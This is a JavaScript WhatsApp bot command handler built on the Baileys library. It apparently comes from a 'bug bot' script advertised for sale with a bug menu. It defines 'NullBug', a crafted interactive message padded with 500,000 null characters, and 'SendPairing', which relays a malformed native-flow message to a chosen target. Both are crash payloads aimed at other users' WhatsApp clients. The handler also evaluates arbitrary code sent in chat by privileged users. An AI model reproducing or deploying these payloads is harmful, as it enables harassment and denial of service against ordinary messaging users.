require('./setting/settings');
const fs = require('fs');
const axios = require('axios');
const path = require('path');
const crypto = require('crypto');
const chalk = require("chalk");
const util = require("util");
const moment = require("moment-timezone");
const { spawn, exec, execSync } = require('child_process');

const { default: baileys, proto, generateWAMessage, generateWAMessageFromContent, getContentType, prepareWAMessageMedia } = require("@whiskeysockets/baileys");

module.exports = ZoO = async (ZoO, m, chatUpdate, store) => {
try {
// Message type handling
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);

const sender = m.key.fromMe
? ZoO.user.id.split(":")[0] || ZoO.user.id
: m.key.participant || m.key.remoteJid;

const senderNumber = sender.split('@')[0];
const budy = (typeof m.text === 'string' ? m.text : '');
const prefa = ["", "!", ".", ",", "🐤", "🗿"];
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.';
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");
const To = ["https://files.catbox.moe/wo5z4s.jpg","https://files.catbox.moe/9rik8l.jpg","https://files.catbox.moe/1ooktt.jpg","https://files.catbox.moe/sef391.jpg","https://files.catbox.moe/6boj1c.jpg"]
const ytta = To[Math.floor(Math.random() * To.length)]
const Kntl = ["https://files.catbox.moe/omcsoabu.jpg"]
const C2 = Kntl[Math.floor(Math.random() * Kntl.length)]
const Tol = ["https://files.catbox.moe/w2et0e.io_1734959001528"]
const ytt = Tol[Math.floor(Math.random() * Tol.length)]
const tdxlol = fs.readFileSync('./message/virtex/tdx.jpeg')

// Database
const kontributor = JSON.parse(fs.readFileSync('./message/lib/database/murbug.json'));
const contacts = JSON.parse(fs.readFileSync('./message/lib/contacts.json'));
const kosong = fs.readFileSync("./message/lib/kosong.jpg")
const botNumber = await ZoO.decodeJid(ZoO.user.id);
const owner = JSON.parse(fs.readFileSync('./message/lib/database/owner.json'))
const isOwner = m.sender == owner+"@s.whatsapp.net" ? true : m.sender == botNumber ? true : false
const isBot = botNumber.includes(senderNumber)
const isAcces = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);
const kontol = m.key.fromMe ? ZoO.user.id.split(':')[0x0] + '@s.whatsapp.net' || ZoO.user.id : m.key.participant || m.key.remoteJid;

// Group function
const groupMetadata = isGroup ? await ZoO.groupMetadata(m.chat).catch((e) => {}) : "";
const groupOwner = isGroup ? groupMetadata.owner : "";
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;

// Media
const Out = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...(from ? {
remoteJid :"status@broadcast"
 }: {})},
 message:
 {"orderMessage":
 {"orderId":"174238614569438",
 "thumbnailUrl": kosong, //image 0kb
 "itemCount": 999999999,
 "status":
 "INQUIRY",
 "surface": "CATALOG",
 "message": `nex`,
 "token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA==" }},
 contextInfo: {"mentionedJid":m.sender.split, "forwardingScore":999,"isForwarded":true}}
 
// Function
const { smsg, sendGmail, formatSize, isUrl, generateMessageTag, getBuffer, getSizeMedia, runtime, fetchJson, sleep } = require('./lib/myfunction');
const { ytdl } = require('./lib/scrape/scrape-ytdl')

// Time
const time = moment.tz("Asia/Jakarta").format("HH:mm:ss");

// Console log
/*if (m.message) {
console.log('\x1b[30m--------------------\x1b[0m');
console.log(chalk.bgHex("#e74c3c").bold(`▢ 𝗠𝗘𝗦𝗦𝗔𝗚𝗘 𝗙𝗥𝗢𝗠 𝙓𝙣𝙖𝙛 𝙍𝙚𝙫𝙤𝙡𝙪𝙩𝙞𝙤𝙣`));
console.log(
chalk.bgHex("#00FF00").black(
` ⌬ Tanggal: ${new Date().toLocaleString()} \n` +
` ⌬ Pesan: ${m.body || m.mtype} \n` +
` ⌬ Pengirim: ${m.pushname} \n` +
` ⌬ JID: ${senderNumber}`
)
);
if (m.isGroup) {
console.log(
chalk.bgHex("#00FF00").black(
` ⌬ Grup: ${groupName} \n` +
` ⌬ GroupJid: ${m.chat}`
)
);
}
console.log();
}
*/

/*BATAS COOLDOWN*/
const userCooldowns = {};
const cooldownTime = 5000; // Cooldown 5 detik
let isCooldownEnabled = false; // Flag untuk 
/*==============================*/
const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `XATANICAL VASION`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6287827536016:+6287827536016\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}


// QuotedBug
    const NullBug = {
      key: {
        remoteJid: "p",
        fromMe: false,
        participant: "0@s.whatsapp.net",
      },
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Skyzo",
            format: "DEFAULT",
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(
              500000
            )}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
            version: 3,
          },
        },
      },
    };
    
    async function SendPairing(target, Ptcp = true) {
			await ZoO.relayMessage(target, {
					viewOnceMessage: {
						message: {
								nativeFlowResponseMessage: {
									"status":true,
                           "criador":"VenomMods","resultado":"\n{\n\"type\":\"md\",\n\"ws\":{\n\"_events\":{\"CB:ib,,dirty\":[\"Array\"]},\n\"_eventsCount\":20,\n\"_maxListeners\":0,\n\"url\":\"wss://web.whatsapp.com/ws/chat\",\n\"config\":{\n\"version\":[\"Array\"],\n\"browser\":[\"Array\"],\n\"waWebSocketUrl\":\"wss://web.whatsapp.com/ws/chat\",\n\"connectTimeoutMs\":20000,\n\"keepAliveIntervalMs\":30000,\n\"logger\":{},\n\"printQRInTerminal\":false,\n\"emitOwnEvents\":true,\n\"defaultQueryTimeoutMs\":60000,\n\"customUploadHosts\":[],\n\"retryRequestDelayMs\":250,\n\"maxMsgRetryCount\":5,\n\"fireInitQueries\":true,\n\"auth\":{\"Object\":\"authData\"},\n\"markOnlineOnConnect\":true,\n\"syncFullHistory\":false,\n\"linkPreviewImageThumbnailWidth\":192,\n\"transactionOpts\":{\"Object\":\"transactionOptsData\"},\n\"generateHighQualityLinkPreview\":false,\n\"options\":{},\n\"appStateMacVerification\":{\"Object\":\"appStateMacData\"},\n\"mobile\":false\n}\n}\n}"
							}
						}
					}
				},
				Ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
};


// Helper functions
const reply = bokep => {
      ZoO.sendMessage(m.chat, {
        'text': bokep,
        'contextInfo': {
          'mentionedJid': [kontol],
          'forwardingScore': 0x98967f,
          'isForwarded': true,
          'externalAdReply': {
            'showAdAttribution': true,
            'containsAutoReply': true,
            'title': "𝙓𝙣𝙖𝙛 𝙍𝙚𝙫𝙤𝙡𝙪𝙩𝙞𝙤𝙣",
            'body': `𝗦𝗸𝘆𝘇𝗼`,
            'previewType': "PHOTO",
            'thumbnailUrl': `${ytta}`,
            'sourceUrl': ''
          }
        }
      }, {
        'quoted': qkontak
      });
    };

const reaction = async (jidss, emoji) => {
ZoO.sendMessage(jidss, { react: { text: emoji, key: m.key }})}

// Command handler
switch (command) {

case 'menu': case "oy": {
const tampilan = `
case free
`
let buttons = [
        { buttonId: ".buysc", buttonText: { displayText: "BuyScript" }, type: 1 },
        { buttonId: ".contact", buttonText: { displayText: "BealXtc" }, type: 1 }
        
    ];
    let buttonMessage = {
    image: { url: `${ytta}` },
gifPlayback: false,
caption: tampilan,
contextInfo: {
externalAdReply: {
title: 'nex',
                    body: 'nex',
                    showAdAttribution: true,
                    thumbnailUrl: `${C2}`,
                    mediaType: 4,
                    MediaUrl: 'https://t.me/@baal',
                    sourceUrl: "https://t.me/@baal",
                }
            },    
        footer: "nex",
        buttons: buttons,
        viewOnce: true,
        headerType: 4
    };

const flowActions = [
    {
        buttonId: 'action',
        buttonText: { displayText: 'This Button List' },
        type: 4,
        nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
                title: "Pilih Menu",
                sections: [
                    {
                        title: "Ini adalah command yang sering diginakan",
                        highlight_label: "POPULER",
                        rows: [
                            { title: "BugMenu", description: "Menampilkan semua fitur bug ", id: ".bugmenu" }
                            ]
                            },
                    {
                        title: "Script Info",
                        highlight_label: "nex",
                        rows: [
                            { title: "Information", description: "Informasi script", id: ".infosc" }
                        ]
                    }
                ]
            })
        },
        viewOnce: true
    },
];

// Tambahkan flowActions ke buttonMessage
buttonMessage.buttons.push(...flowActions);

// Kirim pesan
await ZoO.sendMessage(m.chat, buttonMessage, { quoted: Out });
await ZoO.sendMessage(m.chat, { audio: { url: `${ytt}` }, mimetype: 'audio/mp4', ptt: true }, { quoted: m });
      }
      break

default:
if (budy.startsWith('>')) {
if (!isAcces) return;
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await m.reply(evaled);
} catch (err) {
m.reply(String(err));
}
}

if (budy.startsWith('<')) {
if (!isAcces) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}

}
} catch (err) {
console.log(require("util").format(err));
}
};

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
});